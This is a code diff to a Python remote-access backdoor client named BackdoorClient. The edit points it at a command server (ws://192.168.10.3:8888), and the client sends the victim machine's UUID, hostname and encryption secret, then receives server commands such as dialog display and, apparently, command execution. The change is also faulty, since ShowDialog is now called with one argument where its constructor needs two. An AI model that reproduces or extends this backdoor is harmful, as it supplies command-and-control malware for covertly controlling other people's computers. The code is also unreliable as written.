@@ -4,7 +4,6 @@ import os
 import ctypes
 import subprocess
 import threading
-import chardet
 import uuid
 import json
 import time
@@ -17,7 +16,7 @@ __author__ = 'nekocode'
 class BackdoorClient(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
-        self.SERVER_HOST = 'http://127.0.0.1:8888'
+        self.SERVER_HOST = 'ws://192.168.10.3:8888'
         self.HOST_NAME = hostname()
         self.UUID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
         self.IV = '\0' * AES.block_size
@@ -30,7 +29,7 @@ class BackdoorClient(threading.Thread):
     def run(self):
         while True:
             try:
-                self.ws = create_connection("ws://localhost:8888/")
+                self.ws = create_connection(self.SERVER_HOST)
 
                 sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET)}
                 self.ws.send(json.dumps(sercret_msg))
@@ -42,7 +41,7 @@ class BackdoorClient(threading.Thread):
                     if 'cmd' in msg:
                         command = msg['cmd']
                         if command == 'dialog':
-                            ShowDialog(msg['data'])
+                            ShowDialog(msg)
 
                 self.ws.close()
 
@@ -85,10 +84,11 @@ class ExecCmd(threading.Thread):
 
 
 class ShowDialog(threading.Thread):
-    def __init__(self, content, title=u''):
+    def __init__(self, content, msg):
         threading.Thread.__init__(self)
         self.content = content
-        self.title = title
+        self.msg = msg
+        self.title = msg['data']
 
         self.daemon = True
         self.start()
